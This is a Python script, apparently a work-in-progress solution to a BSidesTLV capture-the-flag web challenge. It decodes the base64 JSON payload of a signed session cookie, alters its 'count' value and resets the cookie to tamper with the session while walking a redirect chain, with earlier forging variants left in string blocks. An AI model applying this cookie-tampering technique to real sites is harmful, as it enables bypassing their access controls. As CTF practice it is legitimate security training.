import requests
import base64
import json


def log(s):
    print("[+] {}".format(s))


s = requests.Session()
cnt1 = 1
cnt = cnt1
url = 'http://challenges.bsidestlv.com:8081/{}.html'.format(cnt1)
#js = "{'count': {' b': u'%s'}}"%(base64.b64encode(str(cnt1)))
#s.cookies.set('session', '', domain='challenges.bsidestlv.com', path='/')
r0 = None
while cnt <= 40:
    if r0 and False:
        url = r0.url
    else:
        url = 'http://challenges.bsidestlv.com:8081/{}.html'.format(cnt)
    cnt += 1
    log(url)
    r0 = s.get(url, allow_redirects=False)
    if 'session' in s.cookies:
        log(s.cookies['session'])
        cook = []
        parts = s.cookies['session'].split('.')
        if len(parts) > 2:
            log(parts[0])
            d = base64.b64decode(parts[0]+'==')
            log(d)
            j = json.loads(d)
            cnt = int(base64.b64decode(j['count'][' b']))
            log(cnt)

            js = '{"count":{" b":"%s"}}' % (base64.b64encode(str(cnt)))
            log(js)
            cook += [base64.b64encode(js)[:-2]]
            cook += s.cookies['session'].split('.')[1:]
            cook = parts
        else:
            cook = parts
        s.cookies.set('session', '.'.join(cook), domain='challenges.bsidestlv.com', path='/')
        log(s.cookies.keys())
        log(s.headers.keys())
    if r0.status_code != 302:
        break
    else:
        log(r0.url)
"""
s=requests.Session()
url = 'http://challenges.bsidestlv.com:8081/{}.html'.format(1)
print(url)
r0 = s.get(url, allow_redirects=False)
cook = s.cookies['session'].split('.')
# print(cook[0])
cookj = base64.b64decode(cook[0] + '=')
# print(cookj)
j = json.loads(cookj)
# print(j)
print(r0, s.cookies.keys(), r0.url)

values = []
for x in range(0,10):
    values.extend([i for i in range(1, 39)])
    values.extend([i for i in range(39, 0, -1)])
cnt = 0
x = 0
fixed = False
for cnt in values:
    url = r0.url
    #url='http://challenges.bsidestlv.com:8081/{}.html'.format(cnt)
    print(url)
    #x += 1
    #if cnt >= 40 and False:
    #    j['count'][' b'] = unicode(base64.b64encode(str(x)))
    #    a = [base64.b64encode(json.dumps(j))[:-2]]
    #    a += cook[1:]
    #    a = '.'.join(a)
    #    s.cookies.set('session', a, domain='challenges.bsidestlv.com', path='/')
    #    print(url, j, base64.b64decode(j['count'][' b']), a)

    r0=s.get(url, allow_redirects=False)
    if 'session' in s.cookies:
        #print(s.cookies['session'])
        cook=s.cookies['session'].split('.')
        #try:
        #    cook0 = cook[0]
        #    cookj = base64.b64decode(cook0)
        #except:
        #    try:
        #        cook0 = cook[0] + '='
        #        cookj = base64.b64decode(cook0)
        #    except:
        #        cook0 = cook[0] + '=='
        #        cookj = base64.b64decode(cook0)
        #if not cookj.endswith('}}'):
        #    cookj += '}'
        #j=json.loads(cookj)
        #print(j)
        #count=int(base64.b64decode(j['count'][' b']))
        #print(r0, count, cook, s.cookies.keys(), r0.url)
        #cnt = count
        if not fixed:
            s.cookies.set('session', '.'.join(cook[1:]), domain='challenges.bsidestlv.com', path='/')
            fixed = True
    print(r0, cook, s.cookies.keys(), r0.url)
"""

"""
count=0
j['count'][' b']=unicode(base64.b64encode(str(count)))
print(j)
a=[base64.b64encode(json.dumps(j))[:-2]]
print(a)
a+=cook[1:]
a='.'.join(a)
s.cookies.set('session', a, domain='challenges.bsidestlv.com', path='/')
print(s.cookies['session'])
r2=s.get('http://challenges.bsidestlv.com:8081', allow_redirects=False)
print(r2, r2.url)
print(s.cookies['session'])
"""
